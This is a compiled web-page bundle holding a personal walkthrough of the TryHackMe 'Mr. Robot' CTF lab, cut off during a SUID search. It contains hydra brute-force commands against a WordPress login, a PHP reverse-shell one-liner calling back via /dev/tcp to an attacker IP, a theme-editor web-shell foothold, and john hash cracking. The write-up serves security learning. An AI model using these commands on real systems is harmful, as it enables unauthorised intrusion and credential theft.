"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[16577],{28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>a});var s=t(96540);const o={},r=s.createContext(o);function i(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:i(e.components),s.createElement(r.Provider,{value:n},e.children)}},44692:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>c,frontMatter:()=>i,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"hacker/tryhackme/mr_robot","title":"TryHackMe Mr. Robot Walkthrough - Complete CTF Solution and Exploitation Guide","description":"Complete walkthrough of TryHackMe\'s Mr. Robot room. Learn web application security, WordPress exploitation, privilege escalation, and CTF techniques.","source":"@site/docs/hacker/tryhackme/mr_robot.md","sourceDirName":"hacker/tryhackme","slug":"/hacker/tryhackme/mr_robot","permalink":"/docs/hacker/tryhackme/mr_robot","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/tryhackme/mr_robot.md","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/tags/tryhackme"},{"inline":true,"label":"ctf","permalink":"/docs/tags/ctf"},{"inline":true,"label":"wordpress","permalink":"/docs/tags/wordpress"},{"inline":true,"label":"web-security","permalink":"/docs/tags/web-security"},{"inline":true,"label":"privilege-escalation","permalink":"/docs/tags/privilege-escalation"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1771617957000,"sidebarPosition":4,"frontMatter":{"title":"TryHackMe Mr. Robot Walkthrough - Complete CTF Solution and Exploitation Guide","description":"Complete walkthrough of TryHackMe\'s Mr. Robot room. Learn web application security, WordPress exploitation, privilege escalation, and CTF techniques.","keywords":["tryhackme mr robot","wordpress exploitation","web application security","privilege escalation","ctf walkthrough","penetration testing"],"tags":["tryhackme","ctf","wordpress","web-security","privilege-escalation"],"sidebar_position":4},"sidebar":"docsSidebar","previous":{"title":"TryHackMe Random Notes - Miscellaneous Security Tips and Techniques","permalink":"/docs/hacker/tryhackme/random"},"next":{"title":"TryHackMe Gatekeeper Walkthrough - Windows Buffer Overflow and Exploitation","permalink":"/docs/hacker/tryhackme/gatekeeper"}}');var o=t(74848),r=t(28453);const i={title:"TryHackMe Mr. Robot Walkthrough - Complete CTF Solution and Exploitation Guide",description:"Complete walkthrough of TryHackMe's Mr. Robot room. Learn web application security, WordPress exploitation, privilege escalation, and CTF techniques.",keywords:["tryhackme mr robot","wordpress exploitation","web application security","privilege escalation","ctf walkthrough","penetration testing"],tags:["tryhackme","ctf","wordpress","web-security","privilege-escalation"],sidebar_position:4},a=void 0,l={},d=[{value:"KEY LEARNINGS",id:"key-learnings",level:2},{value:"RECON",id:"recon",level:2},{value:"NMAP",id:"nmap",level:3},{value:"GOBUSTER",id:"gobuster",level:3},{value:"FLAG 1",id:"flag-1",level:2},{value:"robots.txt",id:"robotstxt",level:3},{value:"FLAG 2",id:"flag-2",level:2},{value:"Brute-force",id:"brute-force",level:3},{value:"Reverse Shell",id:"reverse-shell",level:3},{value:"Crack",id:"crack",level:3},{value:"privesc: user",id:"privesc-user",level:3},{value:"FLAG 3",id:"flag-3",level:2},{value:"suids",id:"suids",level:3},{value:"nmap interactive",id:"nmap-interactive",level:3}];function h(e){const n={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,r.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsxs)(n.admonition,{title:"Description",type:"info",children:[(0,o.jsxs)(n.p,{children:["These are my notes for the ",(0,o.jsx)(n.a,{href:"https://tryhackme.com/room/mrrobot",children:"Mr Robot CTF Room"})," on TryHackMe."]}),(0,o.jsx)(n.p,{children:"Note: Task #1 is to deploy the machine."}),(0,o.jsxs)(n.table,{children:[(0,o.jsx)(n.thead,{children:(0,o.jsxs)(n.tr,{children:[(0,o.jsx)(n.th,{style:{textAlign:"center"},children:"OS"}),(0,o.jsx)(n.th,{style:{textAlign:"center"},children:"Level"}),(0,o.jsx)(n.th,{style:{textAlign:"center"},children:"Rating"})]})}),(0,o.jsx)(n.tbody,{children:(0,o.jsxs)(n.tr,{children:[(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"CTF"}),(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"N/A"}),(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"5/5"})]})})]})]}),"\n",(0,o.jsx)(n.h2,{id:"key-learnings",children:"KEY LEARNINGS"}),"\n",(0,o.jsxs)(n.admonition,{type:"tip",children:[(0,o.jsx)(n.p,{children:'I think given enough of these boxes, I need to have "ON HAND AT ALL TIMES":'}),(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:"nmap lines ready"}),"\n",(0,o.jsx)(n.li,{children:"gobuster lines ready (also enumerate results properly)"}),"\n",(0,o.jsx)(n.li,{children:"key webapp testing checklist e.g. robots.txt"}),"\n",(0,o.jsx)(n.li,{children:"hydra lines ready"}),"\n",(0,o.jsx)(n.li,{children:"php reverse shell setup technique i.e. wp-admin foothold, theme editor, pentestmonkey reverse php page"}),"\n",(0,o.jsx)(n.li,{children:"john cracking lines ready"}),"\n",(0,o.jsx)(n.li,{children:"linux enumeration lines ready e.g. find suids"}),"\n"]})]}),"\n",(0,o.jsx)(n.h2,{id:"recon",children:"RECON"}),"\n",(0,o.jsx)(n.h3,{id:"nmap",children:"NMAP"}),"\n",(0,o.jsx)(n.p,{children:'the "all in one":'}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.code,{children:"sudo nmap -v 10.10.235.193 -Pn -p- -sC -sV -O --min-rate=5000 -o nmap-mr_robot.txt"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"PORT    STATE  SERVICE  VERSION\n22/tcp  closed ssh\n80/tcp  open   http     Apache httpd\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-title: Site doesn't have a title (text/html).\n|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E\n|_http-server-header: Apache\n443/tcp open   ssl/http Apache httpd\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache\n| ssl-cert: Subject: commonName=www.example.com\n| Issuer: commonName=www.example.com\n| Public Key type: rsa\n| Public Key bits: 1024\n| Signature Algorithm: sha1WithRSAEncryption\n| Not valid before: 2015-09-16T10:45:03\n| Not valid after:  2025-09-13T10:45:03\n| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97\n|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E\nDevice type: general purpose|specialized|storage-misc|broadband router|printer|WAP\nRunning (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:5.4 cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4\nAggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%)\nNo exact OS matches for host (test conditions non-ideal).\nUptime guess: 0.000 days (since Sat Apr  2 21:59:23 2022)\nTCP Sequence Prediction: Difficulty=263 (Good luck!)\nIP ID Sequence Generation: All zeros\n"})}),"\n",(0,o.jsx)(n.h3,{id:"gobuster",children:"GOBUSTER"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.code,{children:"gobuster dir -e -u http://10.10.235.193 -w /usr/share/wordlists/dirb/common.txt -o gobuster-mr_robot.txt"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"http://10.10.235.193/.hta                 (Status: 403) [Size: 213]\nhttp://10.10.235.193/.htaccess            (Status: 403) [Size: 218]\nhttp://10.10.235.193/.htpasswd            (Status: 403) [Size: 218]\nhttp://10.10.235.193/0                    (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/0/]\nhttp://10.10.235.193/admin                (Status: 301) [Size: 235] [--\x3e http://10.10.235.193/admin/]\nhttp://10.10.235.193/atom                 (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/feed/atom/]\nhttp://10.10.235.193/audio                (Status: 301) [Size: 235] [--\x3e http://10.10.235.193/audio/]\nhttp://10.10.235.193/blog                 (Status: 301) [Size: 234] [--\x3e http://10.10.235.193/blog/]\nhttp://10.10.235.193/css                  (Status: 301) [Size: 233] [--\x3e http://10.10.235.193/css/]\nhttp://10.10.235.193/dashboard            (Status: 302) [Size: 0] [--\x3e http://10.10.235.193/wp-admin/]\nhttp://10.10.235.193/favicon.ico          (Status: 200) [Size: 0]\nhttp://10.10.235.193/feed                 (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/feed/]\nhttp://10.10.235.193/image                (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/image/]\nhttp://10.10.235.193/Image                (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/Image/]\nhttp://10.10.235.193/images               (Status: 301) [Size: 236] [--\x3e http://10.10.235.193/images/]\nhttp://10.10.235.193/index.html           (Status: 200) [Size: 1077]\nhttp://10.10.235.193/index.php            (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/]\nhttp://10.10.235.193/intro                (Status: 200) [Size: 516314]\nhttp://10.10.235.193/js                   (Status: 301) [Size: 232] [--\x3e http://10.10.235.193/js/]\nhttp://10.10.235.193/license              (Status: 200) [Size: 309]\nhttp://10.10.235.193/login                (Status: 302) [Size: 0] [--\x3e http://10.10.235.193/wp-login.php]\nhttp://10.10.235.193/page1                (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/]\nhttp://10.10.235.193/phpmyadmin           (Status: 403) [Size: 94]\nhttp://10.10.235.193/rdf                  (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/feed/rdf/]\nhttp://10.10.235.193/readme               (Status: 200) [Size: 64]\nhttp://10.10.235.193/robots               (Status: 200) [Size: 41]\nhttp://10.10.235.193/robots.txt           (Status: 200) [Size: 41]\nhttp://10.10.235.193/rss                  (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/feed/]\nhttp://10.10.235.193/rss2                 (Status: 301) [Size: 0] [--\x3e http://10.10.235.193/feed/]\nhttp://10.10.235.193/sitemap              (Status: 200) [Size: 0]\nhttp://10.10.235.193/sitemap.xml          (Status: 200) [Size: 0]\nhttp://10.10.235.193/video                (Status: 301) [Size: 235] [--\x3e http://10.10.235.193/video/]\nhttp://10.10.235.193/wp-admin             (Status: 301) [Size: 238] [--\x3e http://10.10.235.193/wp-admin/]\nhttp://10.10.235.193/wp-content           (Status: 301) [Size: 240] [--\x3e http://10.10.235.193/wp-content/]\nhttp://10.10.235.193/wp-includes          (Status: 301) [Size: 241] [--\x3e http://10.10.235.193/wp-includes/]\nhttp://10.10.235.193/wp-config            (Status: 200) [Size: 0]\nhttp://10.10.235.193/wp-cron              (Status: 200) [Size: 0]\nhttp://10.10.235.193/wp-links-opml        (Status: 200) [Size: 227]\nhttp://10.10.235.193/wp-login             (Status: 200) [Size: 2642]\nhttp://10.10.235.193/wp-load              (Status: 200) [Size: 0]\nhttp://10.10.235.193/wp-mail              (Status: 500) [Size: 3064]\nhttp://10.10.235.193/wp-settings          (Status: 500) [Size: 0]\nhttp://10.10.235.193/wp-signup            (Status: 302) [Size: 0] [--\x3e http://10.10.235.193/wp-login.php?action=register]\nhttp://10.10.235.193/xmlrpc               (Status: 405) [Size: 42]\nhttp://10.10.235.193/xmlrpc.php           (Status: 405) [Size: 42]\n"})}),"\n",(0,o.jsx)(n.h2,{id:"flag-1",children:"FLAG 1"}),"\n",(0,o.jsx)(n.p,{children:"Website running on port 80, so let's browse."}),"\n",(0,o.jsxs)(n.p,{children:["found: ",(0,o.jsx)(n.code,{children:"http://10.10.235.193/robots.txt"})]}),"\n",(0,o.jsx)(n.h3,{id:"robotstxt",children:"robots.txt"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"User-agent: *\nfsocity.dic\nkey-1-of-3.txt\n"})}),"\n",(0,o.jsxs)(n.p,{children:["found: ",(0,o.jsx)(n.code,{children:"http://10.10.235.193/key-1-of-3.txt"})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"073403c8a58a1f80d943455fb30724b9\n"})}),"\n",(0,o.jsxs)(n.p,{children:["downloaded ",(0,o.jsx)(n.code,{children:"fsocity.dic"})," file."]}),"\n",(0,o.jsx)(n.h2,{id:"flag-2",children:"FLAG 2"}),"\n",(0,o.jsx)(n.admonition,{title:"idea",type:"tip",children:(0,o.jsxs)(n.p,{children:["use hydra + ",(0,o.jsx)(n.code,{children:"fsocity.dic"})," file to brute force the wp-admin login page."]})}),"\n",(0,o.jsx)(n.h3,{id:"brute-force",children:"Brute-force"}),"\n",(0,o.jsxs)(n.p,{children:["Use hydra and the ",(0,o.jsx)(n.code,{children:"fsocity.dic"})," file to brute-force the login."]}),"\n",(0,o.jsxs)(n.p,{children:["Format: ",(0,o.jsx)(n.code,{children:"hydra -l <login /> -P <path/to/wordlist /> <ip /> <module /> '/path/to/login.php:login-request&password=^PASS^:failure-message'"})]}),"\n",(0,o.jsxs)(n.p,{children:["I use the following payload to set password as fixed and run through the ",(0,o.jsx)(n.code,{children:"./fsocity.dic"})," file to find valid username i.e. when you get a response that doesn't get ",(0,o.jsx)(n.code,{children:"Invalid username"})," returned:"]}),"\n",(0,o.jsxs)(n.p,{children:["payload: ",(0,o.jsx)(n.code,{children:"hydra -L ./fsocity.dic -p password 10.10.235.193 -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username'"})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'hydra -L ./fsocity.dic -p password 10.10.235.193 -V http-post-form \'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username\'\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations\n, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-02 23:02:35\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task\n[DATA] attacking http-post-form://10.10.235.193:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username\n[ATTEMPT] target 10.10.235.193 - login "true" - pass "password" - 1 of 858235 [child 0] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "false" - pass "password" - 2 of 858235 [child 1] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "wikia" - pass "password" - 3 of 858235 [child 2] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "from" - pass "password" - 4 of 858235 [child 3] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "the" - pass "password" - 5 of 858235 [child 4] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "now" - pass "password" - 6 of 858235 [child 5] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "Wikia" - pass "password" - 7 of 858235 [child 6] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "extensions" - pass "password" - 8 of 858235 [child 7] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "scss" - pass "password" - 9 of 858235 [child 8] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "window" - pass "password" - 10 of 858235 [child 9] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "http" - pass "password" - 11 of 858235 [child 10] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "var" - pass "password" - 12 of 858235 [child 11] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "page" - pass "password" - 13 of 858235 [child 12] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "Robot" - pass "password" - 14 of 858235 [child 13] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "Elliot" - pass "password" - 15 of 858235 [child 14] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "styles" - pass "password" - 16 of 858235 [child 15] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "and" - pass "password" - 17 of 858235 [child 0] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "document" - pass "password" - 18 of 858235 [child 1] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "mrrobot" - pass "password" - 19 of 858235 [child 2] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "com" - pass "password" - 20 of 858235 [child 3] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "ago" - pass "password" - 21 of 858235 [child 4] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "function" - pass "password" - 22 of 858235 [child 5] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "eps1" - pass "password" - 23 of 858235 [child 7] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "null" - pass "password" - 24 of 858235 [child 6] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "chat" - pass "password" - 25 of 858235 [child 8] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "user" - pass "password" - 26 of 858235 [child 9] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "Special" - pass "password" - 27 of 858235 [child 11] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "GlobalNavigation" - pass "password" - 28 of 858235 [child 10] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "images" - pass "password" - 29 of 858235 [child 12] (0/0)\n[ATTEMPT] target 10.10.235.193 - login "net" - pass "password" - 30 of 858235 [child 13] (0/0)\n[80][http-post-form] host: 10.10.235.193   login: Elliot   password: password # <------ bingo!\n[ATTEMPT] target 10.10.235.193 - login "push" - pass "password" - 31 of 858235 [child 14] (0/0)\n'})}),"\n",(0,o.jsxs)(n.p,{children:["now try again, but set username to ",(0,o.jsx)(n.code,{children:"Elliot"})," and cycle through the ",(0,o.jsx)(n.code,{children:"./fsocity.dic"})," file in the password field (change the error message)"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.code,{children:"hydra -l Elliot -P ./fsocity.dic 10.10.235.193 -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:The password you entered for the username' -o hydra-password.txt"})}),"\n",(0,o.jsx)(n.p,{children:"Got a valid username, but no luck on the password."}),"\n",(0,o.jsx)(n.admonition,{type:"tip",children:(0,o.jsxs)(n.p,{children:["hint from walkthrough: ",(0,o.jsx)(n.code,{children:"/license"}),'.\nhint from THM "white coloured font".']})}),"\n",(0,o.jsxs)(n.p,{children:["I look through the gobuster results again and see this ",(0,o.jsx)(n.code,{children:"http://10.10.243.224/license"})]}),"\n",(0,o.jsx)(n.p,{children:"I visit this page and see this:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-html",children:"what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?\n"})}),"\n",(0,o.jsx)(n.p,{children:"But if you inspect it and you see the hidden text:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"do you want a password or something? ZWxsaW90OkVSMjgtMDY1Mgo=\n"})}),"\n",(0,o.jsx)(n.p,{children:"looks base64:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"442 \ud83d\udc80 \xb1 \u27a4 echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d\nelliot:ER28-0652\n"})}),"\n",(0,o.jsx)(n.p,{children:'Now, I\'m thinking "PHP reverse shell" to get a foothold.'}),"\n",(0,o.jsx)(n.h3,{id:"reverse-shell",children:"Reverse Shell"}),"\n",(0,o.jsxs)(n.p,{children:["From ",(0,o.jsx)(n.a,{href:"https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell",children:"highon.coffee"})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-php",children:'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1\'");?>\n'})}),"\n",(0,o.jsx)(n.p,{children:"payload"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-php",children:'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/"10.11.55.83"/443 0>&1\'");?>\n'})}),"\n",(0,o.jsx)(n.p,{children:"this one kept loading/freezing, need to tweak it maybe."}),"\n",(0,o.jsxs)(n.p,{children:["this person has some great notes ",(0,o.jsx)(n.a,{href:"https://n0a110w.github.io/notes/security-stuff/shells/php.html",children:"n0a110w"})," and from their blog I ended up using ",(0,o.jsx)(n.a,{href:"https://github.com/pentestmonkey/php-reverse-shell.git",children:"pentestmonkey php reverse shell"}),"."]}),"\n",(0,o.jsx)(n.admonition,{type:"tip",children:(0,o.jsxs)(n.p,{children:["We need to be able to edit php source code, not html pages, so you need to hit the editor in the Theme section. I replaced the entire ",(0,o.jsx)(n.code,{children:"footer.php"})," file with the pentestmonkey reverse shell file."]})}),"\n",(0,o.jsxs)(n.p,{children:["I created a random page called ",(0,o.jsx)(n.code,{children:"shell"})," in the wordpress ",(0,o.jsx)(n.code,{children:"add page"})," menu, so I know the ",(0,o.jsx)(n.code,{children:"footer.php"}),' gets loaded, "view page" and you pop the shell:']}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"443 \ud83d\udc80 \xb1 \u27a4 sudo rlwrap nc -lvrp 443\nlistening on [any] 443 ...\n10.10.243.224: inverse host lookup failed: Unknown host\nconnect to [10.11.55.83] from (UNKNOWN) [10.10.243.224] 51517\nLinux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n 00:09:03 up  1:45,  0 users,  load average: 0.00, 0.01, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1(daemon) gid=1(daemon) groups=1(daemon)\n/bin/sh: 0: can't access tty; job control turned off\n$\n"})}),"\n",(0,o.jsx)(n.p,{children:"stabilize with python"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"$\nwhich python\n/usr/bin/python\n/usr/bin/python -c 'import pty; pty.spawn(\"/bin/bash\")'\ndaemon@linux:/$\n"})}),"\n",(0,o.jsx)(n.p,{children:"find the flag"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"ls\nls\nbin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var\nboot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz\ncd /home\ncd /home\nls\nls\nrobot\ncd robot\ncd robot\nls\nls\nkey-2-of-3.txt  password.raw-md5\ncat key-2-of-3.txt\ncat key-2-of-3.txt\ncat: key-2-of-3.txt: Permission denied\nls -al\nls -al\ntotal 16\ndrwxr-xr-x 2 root  root  4096 Nov 13  2015 .\ndrwxr-xr-x 3 root  root  4096 Nov 13  2015 ..\n-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt\n-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5\nid;whoami\nid;whoami\nuid=1(daemon) gid=1(daemon) groups=1(daemon)\ndaemon\ndaemon@linux:/home/robot$\n"})}),"\n",(0,o.jsxs)(n.p,{children:["found ",(0,o.jsx)(n.code,{children:"/home/robot"})," flag, can't read flag, but can read the other file:"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"ls -l\nls -l\ntotal 8\n-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt\n-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5\ncat password.raw-md5\ncat password.raw-md5\nrobot:c3fcd3d76192e4007dfb496cca67e13b\ndaemon@linux:/home/robot$\n"})}),"\n",(0,o.jsx)(n.h3,{id:"crack",children:"Crack"}),"\n",(0,o.jsx)(n.p,{children:"copied this password.raw-md5 to my local to crack with john."}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"RxHackk \u798f ~/Repos/RxHack/THM/OFFENSIVEPENTESTPATH/MR_ROBOT/crack \u27a4 a14b989|main\u26a1\n458 \ud83d\udc80 \xb1 \u27a4 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=2\nPress 'q' or Ctrl-C to abort, almost any other key for status\nabcdefghijklmnopqrstuvwxyz (robot)\n1g 0:00:00:02 DONE (2022-04-03 12:21) 0.4975g/s 20155p/s 20155c/s 20155C/s bonjour1..123092\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed\n\nRxHackk \u798f ~/Repos/RxHack/THM/OFFENSIVEPENTESTPATH/MR_ROBOT/crack \u27a4 a14b989|main\u26a1\n459 \ud83d\udc80 \xb1 \u27a4 john --show\nPassword files required, but none specified\n\nRxHackk \u798f ~/Repos/RxHack/THM/OFFENSIVEPENTESTPATH/MR_ROBOT/crack \u27a4 a14b989|main\u26a1\n460 \ud83d\udc80 \xb1 \u27a4 john --show md5.hash\n0 password hashes cracked, 2 left\n\nRxHackk \u798f ~/Repos/RxHack/THM/OFFENSIVEPENTESTPATH/MR_ROBOT/crack \u27a4 a14b989|main\u26a1\n461 \ud83d\udc80 \xb1 \u27a4 john --show --format=Raw-MD5 md5.hash\nrobot:abcdefghijklmnopqrstuvwxyz\n\n1 password hash cracked, 0 left\n"})}),"\n",(0,o.jsx)(n.h3,{id:"privesc-user",children:"privesc: user"}),"\n",(0,o.jsxs)(n.p,{children:["su to ",(0,o.jsx)(n.code,{children:"robot"})," user and get the flag"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"su - robot\nsu - robot\nabcdefghijklmnopqrstuvwxyz\n\nid\nid\nuid=1002(robot) gid=1002(robot) groups=1002(robot)\n/usr/bin/python -c 'import pty; pty.spawn(\"/bin/bash\")'\n/usr/bin/python -c 'import pty; pty.spawn(\"/bin/bash\")'\nls -l\nls -l\ntotal 8\n-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt\n-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5\ncat key-2-of-3.txt\ncat key-2-of-3.txt\n822c73956184f694993bede3eb39f959\nrobot@linux:~$\n"})}),"\n",(0,o.jsx)(n.h2,{id:"flag-3",children:"FLAG 3"}),"\n",(0,o.jsx)(n.p,{children:"back into the box, reverse php page, su to robot user:"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"444 \ud83d\udc80 \xb1 \u27a4 sudo rlwrap nc -lvrp 443\nlistening on [any] 443 ...\n10.10.77.167: inverse host lookup failed: Unknown host\nconnect to [10.11.55.83] from (UNKNOWN) [10.10.77.167] 56597\nLinux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n 00:29:34 up 3 min,  0 users,  load average: 0.35, 0.38, 0.17\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1(daemon) gid=1(daemon) groups=1(daemon)\n/bin/sh: 0: can't access tty; job control turned off\n/usr/bin/python -c 'import pty; pty.spawn(\"/bin/bash\")'\nsu - robot\nsu - robot\nabcdefghijklmnopqrstuvwxyz\n\n/usr/bin/python -c 'import pty; pty.spawn(\"/bin/bash\")'\n/usr/bin/python -c 'import pty; pty.spawn(\"/bin/bash\")'\nrobot@linux:~$\n\nrobot@linux:~$\n\nls -al\nls -al\ntotal 16\ndrwxr-xr-x 2 root  root  4096 Nov 13  2015 .\ndrwxr-xr-x 3 root  root  4096 Nov 13  2015 ..\n-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt\n-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5\n"})}),"\n",(0,o.jsx)(n.h3,{id:"suids",children:"suids"}),"\n",(0,o.jsx)(n.p,{children:"try find SUIDs"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"\nfind / -perm /4000\n/bin/ping\n/bin/umount\n/bin/mount\n/bin/ping6\n/bin/su\nfind: `/etc/ssl/private': Permission denied\n/usr/bin/passwd\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/local/bin/nmap\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper\n/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper\n/usr/lib/pt_chown\nfind: `/root': Permission 